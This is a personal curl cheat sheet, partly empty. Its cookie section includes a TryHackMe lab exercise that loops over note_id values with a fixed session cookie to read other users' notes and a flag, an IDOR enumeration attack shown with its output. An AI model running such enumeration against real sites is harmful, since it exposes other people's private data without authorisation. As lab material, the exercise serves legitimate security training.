# curl

- [Basic](#basic)
- [Check files without downloading it](#check-the-availability-of-files-without-downloading-it)
- [Cookie](#cookie)
- [HTML Form](#html-form)

# Basic

### 
```sh

```

### 
```sh

```

## Check the availability of files without downloading it
```bash
#!/bin/bash

ip="http://example.com"  # Replace with the actual URL of the files

for i in {1..9}; do
    url="$ip/images/slide_$i.jpg"
    response=$(curl -s -I "$url" | grep "HTTP/1.1")

    if [[ "$response" =~ 200 ]]; then
        echo "Image $i is available"
        curl -so "slide_$i.jpg" "$url"   # download the file only if it's available
    else
        echo "Image $i is not available"
    fi
done
```

E.g.
```bash
$ ./script.sh   
Image 4 is available
Image 5 is available
Image 6 is not available
Image 7 is not available
```

# [Cookie](#cookie-1)
## 
```sh
$ curl --help all | g cookie 
 -b, --cookie <data|filename> Send cookies from string/file
 -c, --cookie-jar <filename> Write cookies to <filename> after operation
 -j, --junk-session-cookies Ignore session cookies read from file
```

## 
```sh
$ curl http://$t/note.php?note_id=1 -sb 'PHPSESSID=moi8d3p38cuf81n98nicsibd8u' | html2text          

[Avatar]
***** THM Note Server *****
Things to buy from the store:
2x carrots
1x potato
1x cheese
lots of chocolate!
```

## 
```sh
for i in {0..9}; do
url="http://$t/note.php?note_id=$i"
echo "\n>>> $url"; curl $url -sb 'PHPSESSID=moi8d3p38cuf81n98nicsibd8u' | html2text;
done
```

## 
```sh
$ for i in {0..9}; do
url="http://$t/note.php?note_id=$i"
echo "\n>>> $url"; curl $url -sb 'PHPSESSID=moi8d3p38cuf81n98nicsibd8u' | html2text;
done

>>> http://10.10.19.222/note.php?note_id=0

[Avatar]
***** THM Note Server *****
flag{fivefourthree}

>>> http://10.10.19.222/note.php?note_id=1

[Avatar]
***** THM Note Server *****
Things to buy from the store:
2x carrots
1x potato
1x cheese
lots of chocolate!

>>> http://10.10.19.222/note.php?note_id=2

[Avatar]
***** THM Note Server *****
2022-09-10: Meeting with Sophie S.
2022-09-12: Lunch at Manny's
2022-09-27: Stu's birthday

>>> http://10.10.19.222/note.php?note_id=3

[Avatar]
***** THM Note Server *****
You are not supposed to see this note... Which means you are on the right
track!

>>> http://10.10.19.222/note.php?note_id=4

[Avatar]
***** THM Note Server *****
Mark's new year resolutions 2022:
 - Write actual resolutions for next year
 - Go to the gym (for real)

>>> http://10.10.19.222/note.php?note_id=5

[Avatar]
***** THM Note Server *****
Hint: Do note_ids start from 1? Maybe go lower ;)

>>> http://10.10.19.222/note.php?note_id=6

[Avatar]
***** THM Note Server *****
Error: Note not found!

>>> http://10.10.19.222/note.php?note_id=7

[Avatar]
***** THM Note Server *****
Error: Note not found!

>>> http://10.10.19.222/note.php?note_id=8

[Avatar]
***** THM Note Server *****
Error: Note not found!

>>> http://10.10.19.222/note.php?note_id=9

[Avatar]
***** THM Note Server *****
Error: Note not found!

$ 
```

# [HTML Form](#html-form-1)
## 
```sh
curl -s $t:85 | grep -Pzo '<form[\s\S]*?</form>'
```

## 
```sh

```

## 
```sh

```

## 
```sh

```

## 
```sh

```

## 
```sh

```

## 
```sh

```

# References

